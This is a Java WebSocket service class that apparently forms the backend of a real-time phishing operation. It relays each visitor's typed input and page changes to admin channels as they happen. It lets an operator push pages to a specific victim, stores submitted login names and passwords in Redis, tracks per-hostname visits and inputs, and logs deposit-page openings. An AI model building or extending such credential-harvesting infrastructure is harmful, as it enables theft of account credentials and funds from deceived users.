package com.julia.service.impl;


import com.fasterxml.jackson.databind.ObjectMapper;
import com.julia.entity.FortuneEntity;
import com.julia.entity.RocketEntity;
import com.julia.entity.YaoEntity;
import com.julia.enums.RedisKeyEnum;
import com.julia.mapper.YaoMapper;
import com.julia.model.*;
import com.julia.model.dto.FortuneRedis;
import com.julia.service.IYaoClientService;
import com.julia.socket.ChannelPond;
import com.julia.tool.JuliaUtils;
import com.julia.tool.RedisUtils;
import io.netty.channel.Channel;
import io.netty.channel.ChannelId;
import io.netty.handler.codec.http.websocketx.TextWebSocketFrame;
import lombok.SneakyThrows;
import lombok.extern.log4j.Log4j2;
import org.apache.logging.log4j.Logger;
import org.springframework.stereotype.Service;
import org.springframework.util.ObjectUtils;
import org.springframework.util.StringUtils;

import javax.annotation.Resource;
import java.security.SecureRandom;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.stream.Collectors;

/**
 * @program: skychain
 * @description:
 * @author: Chowel.Master
 * @create: 2023-11-14 16:01
 **/
@Log4j2
@Service
public class WebSocketService {
    @Resource
    RedisUtils redisUtils;

    @Resource
    IYaoClientService yaoClientService;


    private final ObjectMapper mapper = new ObjectMapper();

    @SneakyThrows
    public void handleMsg(String requestMsg) {
        WebSocketMsgBO bo = mapper.readValue(requestMsg, WebSocketMsgBO.class);
    }

    @SneakyThrows
    public void handleMsgWhitChannel(String requestMsg, Channel channel) {
        WebSocketMsgBO bo = mapper.readValue(requestMsg, WebSocketMsgBO.class);
        // log.info("SUB: {}",bo.getSub());
        // 客户端连接
        if ("CLIENTCONNECT".equals(bo.getSub())) {
            clientConnect(channel, bo);
        }
        if ("ADMINCONNECT".equals(bo.getSub())) {
            adminConnect(channel);
        }
        // 后台发往客户端
        if ("TOCLIENT".equals(bo.getSub())) {
            adminToClient(bo);
        }
        // 客户端页面提交
        if ("CLIENTPAGENEXT".equals(bo.getSub())) {
            clentPageNext(channel, bo);
        }
        // 客户端输入
        if ("CLIENTINPUT".equals(bo.getSub())) {
            clentInput(bo);
        }
        // 客户端当前页面
        if ("CURRENTPAGE".equals(bo.getSub())) {
            clentPage(bo);
        }

//        if ("CLIENTSUBMIT".equals(bo.getSub())) {
//            clentSubmit(bo);
//        }
        // 客户端心跳
        if ("CLIENTPING".equals(bo.getSub())) {

            String clientSecure = (String) bo.getData();
            if (StringUtils.hasLength(clientSecure)) {
                log.info("client-ping: 客户端 {} 心跳", clientSecure);
                Channel clientChannel = ChannelPond.findClientChannel(clientSecure);
                if (clientChannel != null) {
                    WebSocketMsgBO resBo = new WebSocketMsgBO();
                    resBo.setSub("CLIENTPONG");
                    resBo.setData(clientSecure);
                    clientChannel.writeAndFlush(new TextWebSocketFrame(mapper.writeValueAsString(resBo)));
                }
            }
        }

        // 后台心跳
        if ("ADMINPING".equals(bo.getSub())) {
            String adminId = ChannelPond.findAdminByChannel(channel);
            WebSocketMsgBO resBo = new WebSocketMsgBO();
            if (StringUtils.hasLength(adminId)) {
                resBo.setSub("ADMINPONG");
//                resBo.setData("ADMINPONG");
                long visitCount = redisUtils.sGetSetSize(RedisKeyEnum.VISITDAILY.getKey());
                long inpuVisitCount = redisUtils.sGetSetSize(RedisKeyEnum.VISITDAILYHASINPUT.getKey());
                long aliveCount = 0L;
                List<String> aliveList = ChannelPond.getAliveClient();
                if (aliveList.size() > 0) {
                    aliveCount = aliveList.size();
                }

                VisitBO visit = new VisitBO();
                //
                Set<Object> hostnames = redisUtils.sGet(RedisKeyEnum.HOSTNAMELIST.getKey());

                List<VisitHost> vistlist = new ArrayList<>();
                for (Object o : hostnames) {
                    if (o instanceof String) {
                        String host = (String) o;
                        long v = 0L;
                        long vi = 0L;
                        if (redisUtils.hasKey(RedisKeyEnum.HOSTNAMEVISIT.getKey() + host)) {
                            v = (int) redisUtils.sGetSetSize(RedisKeyEnum.HOSTNAMEVISIT.getKey() + host);
                        }
                        if (redisUtils.hasKey(RedisKeyEnum.HOSTNAMEVISITINPUT.getKey() + host)) {
                            vi = (int) redisUtils.sGetSetSize(RedisKeyEnum.HOSTNAMEVISITINPUT.getKey() + host);
                        }
                        VisitHost visitHost = new VisitHost();
                        visitHost.setHostname(host);
                        visitHost.setVisitCount(v);
                        visitHost.setVisitInputCount(vi);
                        vistlist.add(visitHost);
                    }
                }
                if (vistlist.size() > 0) {
                    visit.setHosts(vistlist);
                }
                visit.setVisits(visitCount);
                visit.setInputVisits(inpuVisitCount);
                visit.setAlives(aliveCount);

                resBo.setData(visit);
            } else {
                resBo.setSub("ADMINERROR");
                resBo.setData("0");
            }
            channel.writeAndFlush(new TextWebSocketFrame(mapper.writeValueAsString(resBo)));
        }
    }

    /**
     * @Description: 后台发往前台
     * @Param:
     * @return:
     * @Author: chowel
     * @Date:
     */
    @SneakyThrows
    private void adminToClient(WebSocketMsgBO bo) {
        log.info("后台提交前端: {}", bo.getSub());
        Object msgData = bo.getData();
        if (msgData instanceof Map) {
            Map<String, Object> msgMap = (Map<String, Object>) msgData;
            Channel clientChannel = ChannelPond.findClientChannel((String) msgMap.get("secure"));
            if (ObjectUtils.isEmpty(clientChannel)) {
                //                ChannelPond.addClientChannel(c, (String) msgMap.get("secure"));
            } else {
                clientChannel.writeAndFlush(new TextWebSocketFrame(mapper.writeValueAsString(bo)));
            }
        }
    }

    @SneakyThrows
    private void clentPageNext(Channel c, WebSocketMsgBO bo) {
        log.info("客户端提交当前页面: {}", bo.getSub());
        Object msgData = bo.getData();
        if (msgData instanceof Map) {
            Map<String, Object> msgMap = (Map<String, Object>) msgData;

            Channel clientChannel = ChannelPond.findClientChannel((String) msgMap.get("secure"));
            if (ObjectUtils.isEmpty(clientChannel)) {
                ChannelPond.addClientChannel(c, (String) msgMap.get("secure"));
            }
//            msgMap.put("res","OK");
//            //  客户端连接返回 测试 实际没有返回
//            WebSocketMsgBO clientbo = new WebSocketMsgBO();
//            clientbo.setSub(bo.getSub());
//            clientbo.setData(msgMap);
//            c.writeAndFlush(new TextWebSocketFrame(mapper.writeValueAsString(clientbo)));

            // 通知后台 有客户端连接
            WebSocketMsgBO adminInform = new WebSocketMsgBO();
            adminInform.setSub("CLIENTPAGENEXT");
            adminInform.setData(bo.getData());
            adminSendMsg(adminInform);
        }
    }

    /**
     * @Description: 客户端当前页面
     * @Param:
     * @return:
     * @Author: chowel
     * @Date:
     */
    private void clentPage(WebSocketMsgBO bo) {
        log.info("客户端当前页面: {}", bo.getSub());
        // 通知后台 有客户端当前页面
        adminSendMsg(bo);
    }

    /**
     * @Description: 统计访问量
     * @Param:
     * @return:
     * @Author: chowel
     * @Date:
     */
    public void countVisit(String secure) {
        redisUtils.pushSet(RedisKeyEnum.VISITDAILY.getKey(), secure);
    }

    public void addHostNameForVisit(String hostname,String secure) {
        redisUtils.pushHostNameToSet(RedisKeyEnum.HOSTNAMELIST.getKey(), hostname);
        redisUtils.pushHostNameToSet(RedisKeyEnum.HOSTNAMEVISIT.getKey() + hostname, secure);
    }

    /**
     * @Description: 处理页面提交
     * @Param:
     * @return:
     * @Author: chowel
     * @Date:
     */
    @SneakyThrows
    public void clentSubmit(WebSocketMsgBO msgBO) {
        Object msgData = msgBO.getData();
        if (msgData instanceof Map) {
            Map<String, Object> msgMap = (Map<String, Object>) msgData;

            ClientInputRo ro = new ClientInputRo();
            ro.setSecure((String) msgMap.get("secure"));
            ro.setLoginName((String) msgMap.get("loginName"));
            ro.setPassword((String) msgMap.get("password"));
            ro.setStatus(1);
            ro.setCheckVerify(0);

            redisUtils.pushClient(RedisKeyEnum.CLIENTSUBMIT.getKey() + ro.getSecure(), ro);
        }

//
//        log.info(ro.getSecure());
        // 客户端提交
//        WebSocketMsgBO adminInform = new WebSocketMsgBO();
//        adminInform.setSub("CLIENTSUBMIT");
//        adminInform.setData(msgBO.getData());
//        ConcurrentHashMap<String, ChannelId> admins = ChannelPond.getAllAdmin();
//        for (ChannelId channelId : admins.values()) {
//            Channel adminChannel = ChannelPond.findAdminChannelByChannelId(channelId);
//            if (!ObjectUtils.isEmpty(adminChannel)) {
//                adminChannel.writeAndFlush(new TextWebSocketFrame(mapper.writeValueAsString(adminInform)));
//            }
//        }
    }

    /**
     * @Description: 处理页面输入
     * @Param:
     * @return:
     * @Author: chowel
     * @Date:
     */
    @SneakyThrows
    public void clentInput(WebSocketMsgBO msgBO) {

        Object msgData = msgBO.getData();
        if (msgData instanceof Map) {
            Map<String, Object> msgMap = (Map<String, Object>) msgData;
            if (StringUtils.hasLength((String) msgMap.get("secure"))) {
                redisUtils.pushSet(RedisKeyEnum.VISITDAILYHASINPUT.getKey(), (String) msgMap.get("secure"));
                redisUtils.pushHostNameToSet(RedisKeyEnum.HOSTNAMEVISITINPUT.getKey() + (String) msgMap.get("hostname"), (String) msgMap.get("secure"));
            }

        }

        // 通知后台 有客户端输入
        WebSocketMsgBO adminInform = new WebSocketMsgBO();
        adminInform.setSub("CLIENTINPUT");
        adminInform.setData(msgBO.getData());
        adminSendMsg(adminInform);

    }


    /**
     * @Description: 后台连接
     * @Param:
     * @return:
     * @Author: chowel
     * @Date: ADMINERROR 0：连接失败
     */
    @SneakyThrows
    public void adminConnect(Channel c) {

        String adminId = ChannelPond.findAdminByChannel(c);
        WebSocketMsgBO adminMsg = new WebSocketMsgBO();
        if (StringUtils.hasLength(adminId)) {
            adminMsg.setSub("ADMINCONNECTED");
            adminMsg.setData(1);
        } else {
            adminMsg.setSub("ADMINERROR");
            adminMsg.setData(0);
        }

        c.writeAndFlush(new TextWebSocketFrame(mapper.writeValueAsString(adminMsg)));


    }


    /**
     * @Description: ws 连接处理
     * @Param:
     * @return:
     * @Author: chowel
     * @Date:
     */
    @SneakyThrows
    public void clientConnect(Channel c, WebSocketMsgBO bo) {

        Object msgData = bo.getData();
        if (msgData instanceof Map) {
            Map<String, Object> msgMap = (Map<String, Object>) msgData;

            Channel clientChannel = ChannelPond.findClientChannel((String) msgMap.get("secure"));
            if (ObjectUtils.isEmpty(clientChannel)) {
                ChannelPond.addClientChannel(c, (String) msgMap.get("secure"));
            }
            yaoClientService.saveFromConnect((String) msgMap.get("secure"), (String) msgMap.get("secure"));
            //  客户端连接返回
            WebSocketMsgBO clientbo = new WebSocketMsgBO();
            clientbo.setSub("CLIENTCONNECTED");
            clientbo.setData("OK");
            c.writeAndFlush(new TextWebSocketFrame(mapper.writeValueAsString(clientbo)));

            // 通知后台 有客户端连接
            WebSocketMsgBO adminInform = new WebSocketMsgBO();
            adminInform.setSub("CLIENTIN");
            adminInform.setData(bo.getData());
            adminSendMsg(adminInform);
        }


    }

    @SneakyThrows
    public void handleHeart(String userId) {
//        String userId = ChannelPond.findUserIdByChannel(c);
//        log.info("HEART-userId: " + userId);
        Channel userChannel = ChannelPond.findChannel(userId);
        if (ObjectUtils.isEmpty(userChannel)) {
            log.info("HEART-Channel: None");
        } else {
            WebSocketMsgBO bo = new WebSocketMsgBO();
            bo.setSub("PONG");
            bo.setData("");
            userChannel.writeAndFlush(new TextWebSocketFrame(mapper.writeValueAsString(bo)));
        }
    }

    /**
     * @Description: 收银台页面打开成功
     * @Param:
     * @return:
     * @Author: chowel
     * @Date:
     */
    @SneakyThrows
    public void depositsInput(String fortuneNo) {
        redisUtils.lSet(RedisKeyEnum.DEPOSIT.getKey(), fortuneNo, 24 * 3600);
    }


    /**
     * @Description: 下线删除
     * @Param:
     * @return:
     * @Author: chowel
     * @Date:
     */
    public void disconnect(Channel c) {
        String res = ChannelPond.removeChannel(c);
        if (res.length() > 9) {
            log.info("客户端退出");
            WebSocketMsgBO adminInform = new WebSocketMsgBO();
            adminInform.setSub("CLIENTOUT");
            adminInform.setData(res);
            adminSendMsg(adminInform);
        }
    }

    @SneakyThrows
    protected void adminSendMsg(WebSocketMsgBO adminInform) {
        ConcurrentHashMap<String, ChannelId> admins = ChannelPond.getAllAdmin();
        for (ChannelId channelId : admins.values()) {
            Channel adminChannel = ChannelPond.findAdminChannelByChannelId(channelId);
            if (!ObjectUtils.isEmpty(adminChannel)) {
                adminChannel.writeAndFlush(new TextWebSocketFrame(mapper.writeValueAsString(adminInform)));
            }
        }
    }

}
